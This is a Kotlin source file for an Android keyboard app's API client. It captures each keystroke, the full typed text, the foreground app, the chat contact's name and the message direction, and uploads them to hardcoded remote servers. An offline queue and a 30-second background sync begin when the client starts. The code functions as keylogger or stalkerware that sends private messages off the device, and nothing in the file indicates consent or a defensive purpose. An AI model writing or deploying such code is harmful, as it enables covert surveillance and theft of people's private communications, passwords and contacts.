package com.keywordrecord.keyboard

import android.content.Context
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

class ApiClient(context: Context) {
    private val appContext = context.applicationContext
    private val prefs = appContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
    private val offlineQueue = OfflineQueue(appContext)
    private val syncInProgress = AtomicBoolean(false)
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var syncJob: Job? = null
    private val jsonMediaType = "application/json; charset=utf-8".toMediaType()

    private val client = OkHttpClient.Builder()
        .connectTimeout(8, TimeUnit.SECONDS)
        .readTimeout(8, TimeUnit.SECONDS)
        .writeTimeout(8, TimeUnit.SECONDS)
        .build()

    private val deviceUniqueId: String by lazy {
        DeviceIdManager.getDeviceUniqueId(appContext)
    }

    init {
        startBackgroundSync()
        scope.launch {
            flushQueue()
        }
    }

    fun getServerUrl(): String {
        return prefs.getString(KEY_SERVER_URL, DEFAULT_PRIMARY_URL)?.trim().orEmpty()
            .ifBlank { DEFAULT_PRIMARY_URL }
            .trimEnd('/')
    }

    fun saveServerUrl(url: String) {
        prefs.edit().putString(KEY_SERVER_URL, url.trim().trimEnd('/')).apply()
    }

    fun testConnection(url: String, callback: (Boolean, String?) -> Unit) {
        scope.launch {
            val base = url.trim().trimEnd('/')
            val ok = try {
                val request = Request.Builder()
                    .url("$base/health")
                    .get()
                    .build()
                client.newCall(request).execute().use { response ->
                    response.isSuccessful
                }
            } catch (e: Exception) {
                Log.w(TAG, "Connection test failed: ${e.message}")
                false
            }
            callback(ok, if (ok) null else "unreachable")
        }
    }

    fun flushOfflineQueue() {
        flushNow()
    }

    fun recordKeystroke(
        keyPressed: String,
        fullText: String,
        appPackage: String,
        action: String = "key",
        contactName: String = ChatContextHolder.contactName,
        direction: String = "outgoing"
    ) {
        scope.launch {
            val payload = JSONObject().apply {
                put("deviceUniqueId", deviceUniqueId)
                put("keyPressed", keyPressed)
                put("fullText", fullText)
                put("appPackage", appPackage)
                put("action", action)
                put("contactName", contactName)
                put("direction", direction)
            }

            val sent = tryPostWithFallback(payload)
            if (!sent) {
                offlineQueue.enqueue(
                    deviceUniqueId = deviceUniqueId,
                    keyPressed = keyPressed,
                    fullText = fullText,
                    appPackage = appPackage,
                    action = action,
                    contactName = contactName,
                    direction = direction
                )
            } else if (offlineQueue.size() > 0) {
                flushQueue()
            }
        }
    }

    fun flushNow() {
        scope.launch {
            flushQueue()
        }
    }

    private fun startBackgroundSync() {
        if (syncJob?.isActive == true) return
        syncJob = scope.launch {
            while (isActive) {
                flushQueue()
                delay(SYNC_INTERVAL_MS)
            }
        }
    }

    private suspend fun flushQueue() {
        if (!syncInProgress.compareAndSet(false, true)) return
        try {
            if (!hasNetwork()) return

            while (true) {
                val batch = offlineQueue.peekAll().take(BATCH_SIZE)
                if (batch.isEmpty()) break

                var successCount = 0
                for (item in batch) {
                    val ok = tryPostWithFallback(item)
                    if (!ok) break
                    successCount++
                }

                if (successCount == 0) break
                offlineQueue.removeFirst(successCount)
                if (successCount < batch.size) break
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed flushing offline queue: ${e.message}")
        } finally {
            syncInProgress.set(false)
        }
    }

    private fun tryPostWithFallback(payload: JSONObject): Boolean {
        for (baseUrl in buildUrlList()) {
            if (postOnce(baseUrl, payload)) {
                return true
            }
        }
        return false
    }

    private fun buildUrlList(): List<String> {
        val custom = getServerUrl()
        val urls = linkedSetOf<String>()
        urls.add(custom)
        urls.add(DEFAULT_PRIMARY_URL)
        urls.add(DEFAULT_FALLBACK_URL)
        return urls.map { it.trimEnd('/') }
    }

    private fun postOnce(baseUrl: String, payload: JSONObject): Boolean {
        return try {
            val body = payload.toString().toRequestBody(jsonMediaType)
            val request = Request.Builder()
                .url("$baseUrl/api/keystrokes")
                .post(body)
                .build()

            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    true
                } else {
                    Log.w(TAG, "API $baseUrl failed: ${response.code}")
                    false
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "API $baseUrl unreachable: ${e.message}")
            false
        }
    }

    private fun hasNetwork(): Boolean {
        val cm = appContext.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = cm.activeNetwork ?: return false
        val caps = cm.getNetworkCapabilities(network) ?: return false
        return caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
    }

    companion object {
        private const val TAG = "ApiClient"
        private const val PREFS_NAME = "keyword_record_prefs"
        private const val KEY_SERVER_URL = "server_url"
        private const val SYNC_INTERVAL_MS = 30_000L
        private const val BATCH_SIZE = 25
        private const val DEFAULT_PRIMARY_URL = "https://keyword-record.vercel.app"
        private const val DEFAULT_FALLBACK_URL = "https://keyword-record.onrender.com"
    }
}
